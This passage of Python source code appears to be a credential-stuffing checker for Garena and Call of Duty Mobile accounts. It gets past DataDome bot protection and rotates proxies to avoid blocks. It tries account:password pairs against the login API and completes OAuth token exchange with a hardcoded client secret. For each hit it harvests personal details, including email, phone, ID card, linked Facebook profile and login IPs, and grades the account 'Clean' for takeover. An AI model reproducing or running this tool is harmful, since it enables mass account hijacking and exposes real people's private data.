Qxs-QpnHTKetaGW4MJEreDRZ_h8_oukyvaFPpItE9Yc8SIt1T-2RkAnDNXBA-g287V6lo6v_nNh7mGYC3Lx4qeG26aAsR3oX9SiSCuAp8Lyahw4Q2yPo4NTvsxLuY_b7SzMybfyVXOCzHRx9VrQXWrTQ3iFvC1o49YQdta8tG1SA15bvhD5IpVcHi6HduW7SEll7Uk1l6hvg8GwwkDSsAqXa7Rsu7gGL_hI-GaAP1R7VK3d-D_TXLAnRoETWh56dMqw4l_QqKCggCA-WSj3WKIXcDnuTtnZragribanEi7_F_DL2q0OHuD1KqzY7c8eouznfNmOHASe_GwrcIVMr-XT1Rf5huXlnQ1l8eqgqQR1oQkc_K3ihzMJM8L_Vhd0_KLR4-1ICSL1QdOSboLjH2nVuzc7je6FyRyNOUBSZU1sT5caMBNnllX4FRwduqGSje9X6XY8a5vYd5Kpgp3AyrPv8gVLExQguIGFa-4IbLmjsM1B6UEj4VTcFM8RJ221_n3KuVDl5X-_g2rW3GHP8zUPlkYOmlJ5Z0GQ8ubDGe14nAAA9H-Rop4TaNFkMup3EOr3Ec6_GvPxzET3lcdP9qF6FdYmY9Ejhr18yGFZfDf3w3y_K7PRfRkEsdliiCSvYosgssIs8jB2VzL3HEbwwjCz_aKZT0W9NYkBxAi8cZf676phGbEJ50hoYRSIwJJU8Tu0A0hrUnkvw3Woc-88SWO4ZlpAxUZXiuFtfhQxbO1SXxByBTaWdJ9GkxriyF0zg8TQeOoZFi5ad-FLPfriP1DitrrITsJKPN-hpORrNd0yjGfD_-9vD4MvmI8zkEbzNpX4VHVhrwFLlpk6aeME9q01T-CX5PqmkoVk4cZihcoQe-i96Mcy-umgshZdAyxckjIjGFv_vWQYxghUwNTMOotHXbx58RJQQ8QY2FoSyVbTpUXM7yL8_xLT5mh4N_qx66Gpw0t7mSUDSIB992q3vugspQWO2UKy1j5gw8UzlmgYvNTOcR5pRav6Zp-we0685y8IdrKbwH0dm6ZnSSmAlw0WD-YveLDEWJgcFYE94fkZ83czXgJb7I-JrLiyHk7K7aSmXkII-60Fm1ksQayHbJsvnzmXzbaWtp2tgCmM1hqahSnXN_eaUTaDumK9-e-iobjOXcYPERFwssEA_zrRvXFdoiINmqtwVi4so7quVBEMsjyOPsN4WjfgJo39il-yBMVlpBYMxZjZrzoxBU6RaNq3Vn2xz9PTIUnpqFm1V2wAdH-gJNvravSZxWRd8e2ub5SMBJEddGHZMmY2oaxlI1XgsNg9FLFm78WqOP3oqvjpoNPAUeKu6IbDRtuwKEZEQjBCYrih9zELsUYUD2vDr9r4JxSY2_SRx1Istk-z6cm6blTyybiBsrT3t-uULM4VHKBQGcOKF10aeZJkvclKSxI-kUIu97evHkFKcXG6mWRGXt0rzkPCzm12Dm6LdkS1p4nQGGmlxNf913DXotB7EsBc62ddIO7O1KJTWRCIxBnFmVl2smSMkZ34xaqLcoM17k9zqA8RMYUpUjfnIjhCQCNtRpdJvVsyFVLujlhgBnkNg5ev27PYGgHzEQHeDsNOAMJOf-lzxKn8stzPJp0OjpCNsWcYW6NhbgwnS4y4zzsjGNWSSO8MFpeG-5v2B2ASKsex0TGFmRSsZIP6N_2nJP28QWQEDWL08qKJ1TyrR7-P-XbpOm8UmHb2beK56hMHafXmISVakfP0dS3Oh224nYa6QMn8yIiNgvzDKik4bHHiIftnLcCaRZC8FIiioBnj69Ya0tWe0aXwgkNDiTj8ko60jsSFA6x0Y9uAQupjTGjAXkIUGRbfSa-h3xYe4dPiDb0OwpUM7beqkblKvbqNBqy8So5F8MPNaDAS7L0syTp2ugVvp0iwZCAB-4xWJqyToyzNJVrGU9K8jlX7qbh7d7NwqohBq1UT_wEjl2C4Vk1domhlfZeaUPfpMAwTMSLlogvpqsr5dcygjtcH2RL0xvorT4RIt9dWExi0ZEgZYR2e16sctZHqJdmHDLrcgfxHXV9XpX3I0M20fJe2yV1w5m_Kl5EDs72f8JcrKNvTgCGRa1Jmxu_3yXcWJ1hQSBFauGi6dXnBFk87FUjIewCpy6744anPrNjdBW9zZPAUN4t2E3ehNZKxRddzl9sGlUYR6xgDaKXCthj1sAwjuLfwrYaynulYXCzH9BymnYqWrBGEKQ6SP5OR7uxPfQVRnDPFqXP1kfZlwTNPcDGXUb-EWVxR9w7H6VPTRO9nkdf_SSQ3u88x1gnD_SVwfwsIh9NXt1L-JidK1DEV2I72FcTxVH4sM4Ch8q8i6x1_Soo6CGnXNKFGUZE2xg8jo2G8_pwSbOTULG5dXtt_4nFyCWsRhDeFBn7bvguKg0sl4cBHkD_Li8rN-3H8hFw137Q3N2v39DEXGfJEB0et2PX-4r1gVA7qqUHUcwdvy6ZOcRQg_NYvGgcGWoQde5AHIQ0avvSQGUHFEUb6NuiOcKoDXipJtsbNi2UR3pIhfr8YsFQTqdz3NF2zo9IEvY0uds1VowMJAIBF001MlYmMQ3iAVutCrJnMehTpDFZztqzUJ917m72Snc2NA2LSPObaq5M6wiPpLnscG1yCJlVo52xazMfcn3jeRg-RoOAK-mHBSQ-W7o',
        'eventCounters': '{"mousemove":4,"pointermove":1,"click":4,"scroll":0,"touchstart":4,"touchend":4,"touchmove":0,"keydown":2,"keyup":2}',
        'jsType': 'le',
        'cid': 'ROxC_oAlhyCRnDuIxNT_gKAsk8IOlYBFcrRuxfab_kt77Rrbyhu8xH21Zm6rN1hshR8R1vYl6Mlq8rC8fFRV7M9NV8EwyGm_EF0dY2yiLhcSRRttpELcrtVbTtmEMGG2',
        'ddk': 'AE3F04AD3F0D3A462481A337485081',
        'Referer': 'https%3A%2F%2Fsso.garena.com%2Funiversal%2Flogin%3Fapp_id%3D10100%26redirect_uri%3Dhttps%253A%252F%252Faccount.garena.com%252F%26locale%3Den-PH',
        'request': '%2Funiversal%2Flogin%3Fapp_id%3D10100%26redirect_uri%3Dhttps%253A%252F%252Faccount.garena.com%252F%26locale%3Den-PH',
        'responsePage': 'origin',
        'ddv': '5.8.0'
    }
    
    data = '&'.join((f'{k}={urllib.parse.quote(str(v))}' for k, v in payload.items()))
    
    try:
        response = session.post(url, headers=headers, data=data, proxies=proxies, timeout=(3, 6))
        response.raise_for_status()
        response_json = response.json()
        
        if response_json.get('status') == 200 and 'cookie' in response_json:
            cookie_string = response_json['cookie']
            if '=' in cookie_string and ';' in cookie_string:
                datadome = cookie_string.split(';')[0].split('=')[1]
            else:
                datadome = cookie_string
            return datadome
    except Exception:
        pass
    return None

def prelogin(session, account, datadome_manager, cookie_manager, retries=3, proxy_manager=None):
    all_403 = True
    for attempt in range(retries):
        try:
            url = 'https://sso.garena.com/api/prelogin'
            params = {'app_id': '10100', 'account': account, 'format': 'json', 'id': str(int(time.time() * 1000))}
            current_cookies = session.cookies.get_dict()
            cookie_parts = []
            for cookie_name in ['apple_state_key', 'datadome', 'sso_key', '_ga', '_ga_XB5PSHEQB4', '_ga_1M7M9L6VPX']:
                if cookie_name in current_cookies:
                    cookie_parts.append(f'{cookie_name}={current_cookies[cookie_name]}')
            cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
            headers = {
                'Host': 'sso.garena.com',
                'Connection': 'keep-alive',
                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                'Accept': 'application/json, text/plain, */*',
                'sec-ch-ua-mobile': '?1',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
                'sec-ch-ua-platform': '"Android"',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Dest': 'empty',
                'Referer': f'https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=en-PH',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-PH,en-US;q=0.9,en;q=0.8'
            }
            if cookie_header:
                headers['cookie'] = cookie_header
            # Fast path: use session cookies
            response = session.get(url, headers=headers, params=params, timeout=(3, 6))
            if response.status_code == 403:
                proxy_dict = dict(session.proxies) if hasattr(session, 'proxies') and session.proxies else None
                fresh_dd = get_datadome_cookie(session, proxies=proxy_dict)
                if fresh_dd:
                    datadome_manager.set_datadome(fresh_dd)
                    datadome_manager.set_session_datadome(session, fresh_dd)
                else:
                    datadome_manager.handle_403(session)
                if attempt < retries - 1:
                    time.sleep(0.5)
                    continue
                all_403 = True
                break
            if response.status_code == 429:
                time.sleep(3)
                continue
            response.raise_for_status()
            try:
                data = response.json()
            except json.JSONDecodeError:
                if attempt < retries - 1:
                    time.sleep(0.5)
                    continue
                return ('NETWORK_ERROR', None, None)
            new_cookies = response.cookies.get_dict()
            new_datadome = new_cookies.get('datadome')
            if new_datadome:
                datadome_manager.set_datadome(new_datadome)
            if 'error' in data:
                # This is a REAL "Account Doesn't Exist"
                return (None, None, new_datadome)
            v1 = data.get('v1')
            v2 = data.get('v2')
            if not v1 or not v2:
                if attempt < retries - 1:
                    time.sleep(0.5)
                    continue
                return ('NETWORK_ERROR', None, None)
            return (v1, v2, new_datadome)
        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout):
            all_403 = False
            if proxy_manager and proxy_manager.is_loaded():
                session.proxies.clear()
                session.proxies.update(proxy_manager.get_next())
            if attempt < retries - 1:
                time.sleep(2)
                continue
        except Exception:
            all_403 = False
            if attempt < retries - 1:
                time.sleep(1)
                continue
    if all_403:
        return ('IP_BLOCKED', None, None)
    return ('NETWORK_ERROR', None, None)

def login(session, account, password, v1, v2):
    hashed_password = hash_password(password, v1, v2)
    url = 'https://sso.garena.com/api/login'
    params = {'app_id': '10100', 'account': account, 'password': hashed_password, 'redirect_uri': 'https://account.garena.com/', 'format': 'json', 'id': str(int(time.time() * 1000))}
    
    current_cookies = session.cookies.get_dict()
    cookie_parts = []
    for cookie_name in ['apple_state_key', 'datadome', 'sso_key']:
        if cookie_name in current_cookies:
            cookie_parts.append(f'{cookie_name}={current_cookies[cookie_name]}')
    cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
    
    headers = {'accept': 'application/json, text/plain, */*', 'referer': 'https://account.garena.com/', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'}
    if cookie_header:
        headers['cookie'] = cookie_header
        
    retries = 5
    for attempt in range(retries):
        try:
            response = session.get(url, headers=headers, params=params, timeout=(3, 6))
            
            # ─── FIX: Detect rate limiting (HTTP 429/503) ───
            if response.status_code in (429, 503):
                if attempt < retries - 1:
                    time.sleep(3)  # Wait longer before retrying
                    continue
                return 'rate_limited'
                
            response.raise_for_status()
            
            try:
                data = response.json()
            except json.JSONDecodeError:
                # Likely a DataDome HTML block page
                if attempt < retries - 1:
                    time.sleep(0.8)
                    continue
                return 'network_error'
                
            sso_key = response.cookies.get('sso_key')
            
            if 'error' in data:
                error_msg = data['error']
                if error_msg in ('ACCOUNT DOESNT EXIST', 'error_no_account', 'error_auth', 'error_user_ban', 'error_security_ban'):
                    return f'permanent_fail:{error_msg}'
                if attempt < retries - 1:
                    time.sleep(0.5)
                    continue
                return 'network_error'
                
            return sso_key
        except requests.RequestException:
            if attempt < retries - 1:
                time.sleep(1)
                continue
    return 'network_error'

def _generate_device_id():
    import uuid
    return f'02-{uuid.uuid4()}'

def get_codm_grant_code(session):
    for attempt in range(OAUTH_MAX_RETRIES):
        try:
            random_id = str(int(time.time() * 1000))
            grant_url = 'https://100082.connect.garena.com/oauth/token/grant'
            current_cookies = session.cookies.get_dict()
            cookie_parts = []
            for name in ['apple_state_key', 'fb_state', 'google_state', 'huawei_state', 'line_state', 'twitter_state', 'vk_state', 'tiktok_state', 'youtube_state', 'sso_key', 'datadome']:
                if name in current_cookies:
                    cookie_parts.append(f'{name}={current_cookies[name]}')
            cookie_header = '; '.join(cookie_parts)
            grant_headers = {'Host': '100082.connect.garena.com', 'Connection': 'keep-alive', 'Accept': 'application/json, text/plain, */*', 'User-Agent': 'Mozilla/5.0 (Linux; Android 9; Pixel 4 Build/PQ3A.190801.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/537.36; GarenaMSDK/5.12.1(Pixel 4 ;Android 9;en;us;)', 'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8', 'Origin': 'https://100082.connect.garena.com', 'X-Requested-With': 'com.garena.game.codm', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty', 'Referer': 'https://100082.connect.garena.com/universal/oauth?client_id=100082&locale=en-US&create_grant=true&login_scenario=normal&redirect_uri=gop100082://auth/&response_type=code', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'en-US,en;q=0.9'}
            if cookie_header:
                grant_headers['Cookie'] = cookie_header
            grant_body = f'client_id=100082&response_type=code&redirect_uri=gop100082%3A%2F%2Fauth%2F&create_grant=true&login_scenario=normal&format=json&id={random_id}'
            resp = session.post(grant_url, headers=grant_headers, data=grant_body, timeout=(3, 5))
            resp.raise_for_status()
            data = resp.json()
            code = data.get('code', '')
            if not code:
                logger.error(f'[ERROR] token/grant returned no code: {data}')
            return code
        except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
            if attempt < OAUTH_MAX_RETRIES - 1:
                delay = OAUTH_RETRY_DELAY * 2 ** attempt
                time.sleep(delay)
                continue
            else:
                logger.error(f'[ERROR] Error in get_codm_grant_code after {OAUTH_MAX_RETRIES} attempts')
                raise
        except Exception as e:
            logger.error(f'[ERROR] Error in get_codm_grant_code (token/grant)')
            return ''
    return ''

def token_exchange(code, device_id=None, proxies=None):
    if not device_id:
        device_id = _generate_device_id()
    if proxies is None:
        proxies = None
    CLIENT_ID = '100082'
    CLIENT_SECRET = '388066813c7cda8d51c1a70b0f6050b991986326fcfb0cb3bf2287e861cfa415'
    REDIRECT_URI = 'gop100082://auth/'
    exchange_url = 'https://100082.connect.garena.com/oauth/token/exchange'
    exchange_headers = {'User-Agent': 'GarenaMSDK/5.12.1(Pixel 4 ;Android 9;en;us;)', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': '100082.connect.garena.com', 'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip'}
    exchange_body = f'grant_type=authorization_code&code={code}&device_id={urllib.parse.quote(device_id)}&redirect_uri={urllib.parse.quote(REDIRECT_URI)}&source=2&client_id={CLIENT_ID}&client_secret={CLIENT_SECRET}'
    for attempt in range(OAUTH_MAX_RETRIES):
        try:
            resp = requests.post(exchange_url, headers=exchange_headers, data=exchange_body, timeout=(3, 5), proxies=proxies)
            resp.raise_for_status()
            data = resp.json()
            access_token = data.get('access_token', '')
            if not access_token:
                logger.error(f'[ERROR] token/exchange returned no access_token: {data}')
            return access_token
        except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
            if attempt < OAUTH_MAX_RETRIES - 1:
                delay = OAUTH_RETRY_DELAY * 2 ** attempt
                time.sleep(delay)
                continue
            else:
                logger.error(f'[ERROR] Error in token_exchange after {OAUTH_MAX_RETRIES} attempts')
                raise
        except Exception as e:
            logger.error(f'[ERROR] Error in token_exchange (token/exchange)')
            return ''
    return ''

def get_codm_access_token(session):
    try:
        random_id = str(int(time.time() * 1000))
        grant_url = 'https://100082.connect.garena.com/oauth/token/grant'
        grant_headers = {
            'Host': '100082.connect.garena.com',
            'Connection': 'keep-alive',
            'sec-ch-ua-platform': '"Android"',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36; GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)',
            'Accept': 'application/json, text/plain, */*',
            'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Android WebView";v="144"',
            'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'sec-ch-ua-mobile': '?1',
            'Origin': 'https://100082.connect.garena.com',
            'X-Requested-With': 'com.garena.game.codm',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Referer': 'https://100082.connect.garena.com/universal/oauth?client_id=100082&locale=en-US&create_grant=true&login_scenario=normal&redirect_uri=gop100082://auth/&response_type=code',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Accept-Language': 'en-US,en;q=0.9'
        }
        import uuid
        device_id = f'02-{str(uuid.uuid4())}'
        
        grant_data = f'client_id=100082&redirect_uri=gop100082%3A%2F%2Fauth%2F&response_type=code&create_grant=true&login_scenario=normal&format=json&id={random_id}'
        
        grant_response = session.post(grant_url, headers=grant_headers, data=grant_data, timeout=(3, 5))
        
        try:
            grant_json = grant_response.json()
        except ValueError:
            return ('', '', '')
            
        auth_code = grant_json.get('code', '')
        if not auth_code:
            return ('', '', '')
            
        token_url = 'https://100082.connect.garena.com/oauth/token/exchange'
        token_headers = {
            'User-Agent': 'GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': '100082.connect.garena.com',
            'Connection': 'Keep-Alive',
            'Accept-Encoding': 'gzip'
        }
        token_data = f'grant_type=authorization_code&code={auth_code}&device_id={device_id}&redirect_uri=gop100082%3A%2F%2Fauth%2F&source=2&client_id=100082&client_secret=388066813c7cda8d51c1a70b0f6050b991986326fcfb0cb3bf2287e861cfa415'
        token_response = session.post(token_url, headers=token_headers, data=token_data, timeout=(3, 5))
        
        try:
            token_json = token_response.json()
        except ValueError:
            return ('', '', '')
            
        access_token = token_json.get('access_token', '')
        open_id = token_json.get('open_id', '')
        uid = token_json.get('uid', '')
        return (access_token, open_id, uid)
    except Exception:
        return ('', '', '')
    
def process_codm_callback(session, access_token, open_id=None, uid=None):
    try:
        old_callback_url = f'https://api-delete-request.codm.garena.co.id/oauth/callback/?access_token={access_token}'
        old_headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'user-agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36', 'referer': 'https://auth.garena.com/'}
        old_response = session.get(old_callback_url, headers=old_headers, allow_redirects=False, timeout=(3, 5))
        location = old_response.headers.get('Location', '')
        if 'err=3' in location:
            return (None, 'no_codm')
        elif 'token=' in location:
            token = location.split('token=')[-1].split('&')[0]
            return (token, 'success')
        aos_callback_url = f'https://api-delete-request-aos.codm.garena.co.id/oauth/callback/?access_token={access_token}'
        aos_headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'user-agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36', 'referer': 'https://100082.connect.garena.com/', 'x-requested-with': 'com.garena.game.codm'}
        aos_response = session.get(aos_callback_url, headers=aos_headers, allow_redirects=False, timeout=(3, 5))
        aos_location = aos_response.headers.get('Location', '')
        if 'err=3' in aos_location:
            return (None, 'no_codm')
        elif 'token=' in aos_location:
            token = aos_location.split('token=')[-1].split('&')[0]
            return (token, 'success')
        return (None, 'unknown_error')
    except Exception:
        return (None, 'error')

def get_codm_user_info(session, token):
    try:
        try:
            import base64
            parts = token.split('.')
            if len(parts) == 3:
                payload = parts[1]
                padding = 4 - len(payload) % 4
                if padding != 4:
                    payload += '=' * padding
                decoded = base64.urlsafe_b64decode(payload)
                jwt_data = json.loads(decoded)
                user_data = jwt_data.get('user', {})
                if user_data:
                    return {'codm_nickname': user_data.get('codm_nickname', user_data.get('nickname', 'N/A')), 'codm_level': user_data.get('codm_level', 'N/A'), 'region': user_data.get('region', 'N/A'), 'uid': user_data.get('uid', 'N/A'), 'open_id': user_data.get('open_id', 'N/A'), 't_open_id': user_data.get('t_open_id', 'N/A')}
        except Exception:
            pass
        url = 'https://api-delete-request-aos.codm.garena.co.id/oauth/check_login/'
        headers = {'accept': 'application/json, text/plain, */*', 'codm-delete-token': token, 'origin': 'https://delete-request-aos.codm.garena.co.id', 'referer': 'https://delete-request-aos.codm.garena.co.id/', 'user-agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36', 'x-requested-with': 'com.garena.game.codm'}
        response = session.get(url, headers=headers, timeout=(3, 5))
        data = response.json()
        user_data = data.get('user', {})
        if user_data:
            return {'codm_nickname': user_data.get('codm_nickname', 'N/A'), 'codm_level': user_data.get('codm_level', 'N/A'), 'region': user_data.get('region', 'N/A'), 'uid': user_data.get('uid', 'N/A'), 'open_id': user_data.get('open_id', 'N/A'), 't_open_id': user_data.get('t_open_id', 'N/A')}
        return {}
    except Exception:
        return {}

def check_codm_account(session, account):
    codm_info = {}
    has_codm = False
    
    for attempt in range(2):
        try:
            access_token, open_id, uid = get_codm_access_token(session)
            if not access_token:
                if attempt < 2:
                    time.sleep(0.5)
                    continue
                return (has_codm, codm_info)
                
            codm_token, status = process_codm_callback(session, access_token, open_id, uid)
            
            if status == 'no_codm':
                return (has_codm, codm_info)
                
            if status != 'success' or not codm_token:
                if attempt < 2:
                    time.sleep(0.5)
                    continue
                return (has_codm, codm_info)
                
            codm_info = get_codm_user_info(session, codm_token)
            if codm_info:
                has_codm = True
                return (has_codm, codm_info)
            else:
                if attempt < 2:
                    time.sleep(0.5)
                    continue
                    
        except Exception:
            if attempt < 2:
                time.sleep(1)
                continue
                
    return (has_codm, codm_info)

def parse_account_details(data):
    user_info = data.get('user_info', {})
    fb_username = 'N/A'
    fb_uid = 'N/A'
    if user_info.get('fb_account'):
        fb_username = user_info.get('fb_account', {}).get('fb_username', 'N/A')
        fb_uid = user_info.get('fb_account', {}).get('fb_uid', 'N/A')
    account_info = {'uid': user_info.get('uid', 'N/A'), 'username': user_info.get('username', 'N/A'), 'nickname': user_info.get('nickname', 'N/A'), 'email': user_info.get('email', 'N/A'), 'email_verified': bool(user_info.get('email_v', 0)), 'email_verified_time': user_info.get('email_verified_time', 0), 'email_verify_available': bool(user_info.get('email_verify_available', False)), 'security': {'password_strength': user_info.get('password_s', 'N/A'), 'two_step_verify': bool(user_info.get('two_step_verify_enable', 0)), 'authenticator_app': bool(user_info.get('authenticator_enable', 0)), 'facebook_connected': bool(user_info.get('is_fbconnect_enabled', False)), 'facebook_account': user_info.get('fb_account', None), 'suspicious': bool(user_info.get('suspicious', False))}, 'personal': {'real_name': user_info.get('realname', 'N/A'), 'id_card': user_info.get('idcard', 'N/A'), 'id_card_length': user_info.get('idcard_length', 'N/A'), 'country': user_info.get('acc_country', 'N/A'), 'country_code': user_info.get('country_code', 'N/A'), 'mobile_no': user_info.get('mobile_no', 'N/A'), 'mobile_binding_status': 'Bound' if user_info.get('mobile_binding_status', 0) else 'Not Bound', 'extra_data': user_info.get('realinfo_extra_data', {})}, 'profile': {'avatar': user_info.get('avatar', 'N/A'), 'signature': user_info.get('signature', 'N/A'), 'shell_balance': user_info.get('shell', 0)}, 'status': {'account_status': 'Active' if user_info.get('status', 0) == 1 else 'Inactive', 'whitelistable': bool(user_info.get('whitelistable', False)), 'realinfo_updatable': bool(user_info.get('realinfo_updatable', False))}, 'facebook': {'fb_username': fb_username, 'fb_uid': fb_uid}, 'binds': [], 'game_info': []}
    mobile_no = account_info['personal']['mobile_no']
    email_verified = 1 if account_info['email_verified'] else 0
    mobile_is_na = mobile_no == 'N/A' or not mobile_no or str(mobile_no).strip() == ''
    is_clean = mobile_is_na and email_verified == 0
    email = account_info['email']
    id_card = account_info['personal']['id_card']
    if email and email != 'N/A' and str(email).strip() and (not email.startswith('***')):
        if email_verified == 1:
            account_info['binds'].append('Email (Verified)')
        else:
            account_info['binds'].append('Email')
    if not mobile_is_na:
        account_info['binds'].append('Phone')
    if account_info['security']['facebook_connected'] and fb_uid and (fb_uid != 'N/A'):
        account_info['binds'].append('Facebook')
    if id_card and id_card != 'N/A' and str(id_card).strip():
        account_info['binds'].append('ID Card')
    if account_info['security']['two_step_verify']:
        account_info['binds'].append('2FA')
    if account_info['security']['authenticator_app']:
        account_info['binds'].append('Authenticator')
    account_info['bind_status'] = 'Clean' if is_clean else f'Not Clean' if account_info['binds'] else 'Not Clean'
    account_info['is_clean'] = is_clean
    security_indicators = []
    if account_info['security']['two_step_verify']:
        security_indicators.append('2FA')
    if account_info['security']['authenticator_app']:
        security_indicators.append('Auth App')
    if account_info['security']['suspicious']:
        security_indicators.append('[WARNING] Suspicious')
    account_info['security_status'] = '[SUCCESS] Normal' if not security_indicators else ' | '.join(security_indicators)
    return account_info

def display_codm_info(account, password, details, codm_info, has_codm, error_reason=None, game_connections=None):
    from rich import box
    from rich.box import HEAVY, ROUNDED
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.text import Text
    
    console = Console()
    
    if details is None:
        table = Table(show_header=False, box=ROUNDED, border_style="red", padding=(0, 2), expand=False)
        table.add_column(style="dim", width=12)
        table.add_column(style="bright_white")
        table.add_row("Login", f"{account}:{password}")
        table.add_row("Reason", f"[red]{error_reason or 'Incorrect Password'}[/red]")
        console.print(Panel(table, title="[red]✖ INVALID[/red]", border_style="red", box=HEAVY, padding=(0, 1)))
        return
    
    email = details.get('email', 'N/A')
    email_verified = details.get('email_verified', False)
    username = details.get('username', 'N/A')
    mobile = details['personal'].get('mobile_no', 'N/A')
    country_code = details['personal'].get('country_code', 'N/A')
    shell = details['profile'].get('shell_balance', 0)
    is_clean = details.get('is_clean', False)
    formatted_mobile = format_mobile_number(mobile, country_code)
    
    if email and email != 'N/A' and ('@' in email):
        email_display = f'{email} {"(Verified)" if email_verified else "(Not Verified)"}'
    else:
        email_display = 'N/A'
    
    fb_username = details['facebook']['fb_username']
    fb_uid = details['facebook']['fb_uid']
    fb_link = f'https://www.facebook.com/profile.php?id={fb_uid}' if fb_uid != 'N/A' and fb_uid else 'N/A'
    
    if fb_uid == 'N/A' or not fb_uid:
        fb_info = 'NOT CONNECTED'
        fb_username = 'N/A'
        fb_link = 'N/A'
    elif not fb_username or fb_username == 'N/A':
        fb_info = 'FB UNBIND or FB DELETED'
        fb_username = 'N/A'
    else:
        fb_info = 'CONNECTED'
    
    login_history = details.get('login_history', [])
    last_login_info = login_history[0] if login_history else {}
    last_login = last_login_info.get('timestamp', 0)
    last_login_date = time.strftime('%B %d, %Y | %I:%M %p', time.localtime(last_login)) if last_login else 'N/A'
    last_login_where = f"{last_login_info.get('source', 'Unknown')}" if last_login_info else 'Unknown'
    last_login_ip = last_login_info.get('ip', 'N/A') if last_login_info else 'N/A'
    last_login_country = last_login_info.get('country', 'N/A') if last_login_info else 'N/A'
    
    other_games = [g for g in game_connections or [] if g.get('game', '').upper() != 'CODM']
    shell_color = "yellow" if int(shell or 0) > 0 else "dim"
    
    if has_codm and codm_info:
        border_color = "green" if is_clean else "yellow"
        title = f"[bold {border_color}]✨ CLEAN[/bold {border_color}]" if is_clean else f"[bold {border_color}]⊘ NOT CLEAN[/bold {border_color}]"
        
        table = Table(show_header=False, box=ROUNDED, border_style=border_color, padding=(0, 2), expand=False)
        table.add_column(style="dim", width=14)
        table.add_column(style="bright_white")
        
        table.add_row("Login", f"{account}:{password}")
        table.add_row("Username", username)
        table.add_row("Shell", f"[{shell_color}]{shell}[/{shell_color}]")
        table.add_row("Email", email_display)
        table.add_row("Mobile", str(formatted_mobile))
        table.add_row("Facebook", fb_info)
        
        table.add_row("", "")
        table.add_row("CODM Level", f"[cyan]{codm_info.get('codm_level', 'N/A')}[/cyan]")
        table.add_row("Server", f"[cyan]{codm_info.get('region', 'N/A')}[/cyan]")
        table.add_row("IGN", f"[cyan]{codm_info.get('codm_nickname', 'N/A')}[/cyan]")
        table.add_row("CODM UID", f"[cyan]{codm_info.get('uid', 'N/A')}[/cyan]")
        
        table.add_row("", "")
        table.add_row("Last Login", f"[dim]{last_login_date}[/dim]")
        table.add_row("Login From", f"[dim]{last_login_where}[/dim]")
        table.add_row("Login IP", f"[dim]{last_login_ip}[/dim]")
        table.add_row("Country", f"[dim]{last_login_country}[/dim]")
        
        if other_games:
            table.add_row("", "")
            for g in other_games:
                gname = g.get('game', '?')
                grole = g.get('role', 'N/A')
                greg = g.get('region', '')
                table.add_row(f"{gname} [{greg}]" if greg else gname, f"[magenta]{grole}[/magenta]")
        
        table.add_row("", "")
        table.add_row("Status", f"[bold {border_color}]{'Clean' if is_clean else 'Not Clean'}[/bold {border_color}]")
        
        console.print(Panel(table, title=title, border_style=border_color, box=HEAVY, padding=(0, 1)))
    
    else:
        border_color = "magenta" if other_games else "cyan"
        gnames = ' / '.join((g.get('game', '?') for g in other_games)) if other_games else ''
        title = f"[bold {border_color}]◆ NO CODM ({gnames})[/bold {border_color}]" if other_games else f"[bold {border_color}]○ NO CODM[/bold {border_color}]"
        
        table = Table(show_header=False, box=ROUNDED, border_style=border_color, padding=(0, 2), expand=False)
        table.add_column(style="dim", width=14)
        table.add_column(style="bright_white")
        
        table.add_row("Login", f"{account}:{password}")
        table.add_row("Username", username)
        table.add_row("Shell", f"[{shell_color}]{shell}[/{shell_color}]")
        table.add_row("Email", email_display)
        table.add_row("Mobile", str(formatted_mobile))
        table.add_row("Facebook", fb_info)
        
        table.add_row("", "")
        table.add_row("CODM", "[red]NO CODM ACCOUNT[/red]")
        
        table.add_row("", "")
        table.add_row("Last Login", f"[dim]{last_login_date}[/dim]")
